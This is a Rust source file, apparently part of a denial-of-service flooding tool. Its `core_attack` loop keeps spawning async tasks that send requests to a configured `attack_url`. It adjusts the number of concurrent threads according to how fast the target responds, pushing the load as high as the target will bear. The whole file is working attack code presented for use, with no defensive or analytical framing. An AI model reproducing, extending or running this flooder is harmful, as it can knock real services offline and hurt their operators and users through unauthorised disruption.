use tokio::time::Instant;

use crate::extra_fn;
use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};

pub async fn start() {
    loop {
        core_attack();
    }
}

fn core_attack() {
    if let Ok(mut threads) = SAFE_PUB_VAR.lock() {
        if threads.thread_on + 1.0 < threads.threads_allowed {
            threads.thread_on += 1.0;
            unsafe {
                UNSAFE_PUB_VAR.threads_on += 1.0;
            }
            drop(threads);
            tokio::spawn(async {
                let now = Instant::now();
                unsafe {
                    let error_data = extra_fn::request(&UNSAFE_PUB_VAR.attack_url);
                    match error_data.await {
                        Ok(status_code) => {
                            let mut add_or_not: bool = true;
                            if now.elapsed().as_secs() > 40 {
                                add_or_not = false;
                            }
                            let wait = modify_pub_data(add_or_not);
                            UNSAFE_PUB_VAR.amount_sent += 1.0;
                            println!(
                                "Threads on {},\n Status code {},\n Request sent {}\n Time Elapsed {}",
                                UNSAFE_PUB_VAR.threads_on,
                                status_code.status(),
                                UNSAFE_PUB_VAR.amount_sent,
                                now.elapsed().as_secs()
                            );
                            wait.await;
                            UNSAFE_PUB_VAR.threads_on -= 1.0;
                        }
                        Err(data) => {
                            let wait = modify_pub_data(false);
                            println!(
                                "Threads on {}, Status ERROR {}\n Request sent {}\n, Time Elapsed {}",
                                UNSAFE_PUB_VAR.threads_on,
                                data,
                                UNSAFE_PUB_VAR.amount_sent,
                                now.elapsed().as_secs()
                            );
                            wait.await;
                            UNSAFE_PUB_VAR.threads_on -= 1.0;
                        }
                    }
                }
            });
        }
    }
}


async fn modify_pub_data(add: bool) {
    loop {
        if let Ok(mut data) = SAFE_PUB_VAR.lock() {
            if add {
                data.threads_allowed += 0.01;
            } else if data.threads_allowed > 0.0 && !add {
                data.threads_allowed -= 0.05;
                println!("{}", &data.threads_allowed);
            }
            data.thread_on -= 1.0;
            drop(data);
            break;
        }
    }
}